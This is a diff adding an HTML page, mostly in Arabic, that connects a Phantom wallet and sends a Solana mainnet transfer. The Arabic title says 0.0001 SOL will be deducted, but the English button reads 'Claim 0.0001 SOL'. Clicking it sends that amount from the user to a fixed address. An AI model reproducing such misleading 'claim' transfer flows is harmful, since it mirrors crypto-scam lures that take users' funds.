@@ -1,0 +1,75 @@
+<!doctype html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ربط المحفظة وخصم 0.0001 SOL</title>
+    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.31.0/dist/web3.min.js"></script>
+</head>
+<body>
+    <h1>ربط المحفظة وخصم 0.0001 SOL</h1>
+    <button id="connectButton">ربط المحفظة</button>
+    <button id="claimButton" disabled>Claim 0.0001 SOL</button>
+
+    <script>
+        let provider;
+        let walletAddress;
+
+        // زر ربط المحفظة
+        document.getElementById("connectButton").addEventListener("click", async () => {
+            provider = window.solana;
+
+            if (provider && provider.isPhantom) {
+                try {
+                    // طلب الإذن لربط المحفظة
+                    await provider.connect();
+                    walletAddress = provider.publicKey.toString();
+                    console.log("Wallet Address:", walletAddress);
+                    alert("تم ربط المحفظة بنجاح!");
+
+                    // تفعيل زر الخصم بعد ربط المحفظة
+                    document.getElementById("claimButton").disabled = false;
+                } catch (error) {
+                    console.error("فشل ربط المحفظة:", error);
+                    alert("فشل ربط المحفظة، حاول مرة أخرى.");
+                }
+            } else {
+                alert("يرجى تثبيت محفظة Phantom واستخدام متصفح يدعمها.");
+            }
+        });
+
+        // زر الخصم
+        document.getElementById("claimButton").addEventListener("click", async () => {
+            if (!provider || !walletAddress) {
+                alert("يرجى ربط المحفظة أولاً.");
+                return;
+            }
+
+            try {
+                // الاتصال بالشبكة الرئيسية
+                const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("mainnet-beta"), "confirmed");
+                const sender = new solanaWeb3.PublicKey(walletAddress);
+                const receiver = new solanaWeb3.PublicKey("BaGjPnLpffsWjLWhA2xoDTEBLJUCiioS5JSJTpBP9S5w");
+
+                // إنشاء معاملة لتحويل 0.0001 SOL
+                const transaction = new solanaWeb3.Transaction().add(
+                    solanaWeb3.SystemProgram.transfer({
+                        fromPubkey: sender,
+                        toPubkey: receiver,
+                        lamports: 0.0001 * solanaWeb3.LAMPORTS_PER_SOL,
+                    })
+                );
+
+                // توقيع وإرسال المعاملة
+                const { signature } = await provider.signAndSendTransaction(transaction);
+                await connection.confirmTransaction(signature, "confirmed");
+                console.log("Transaction Signature:", signature);
+                alert("تمت المعاملة بنجاح!");
+            } catch (error) {
+                console.error("فشل المعاملة:", error);
+                alert("فشلت المعاملة، حاول مرة أخرى.");
+            }
+        });
+    </script>
+
+</body></html>
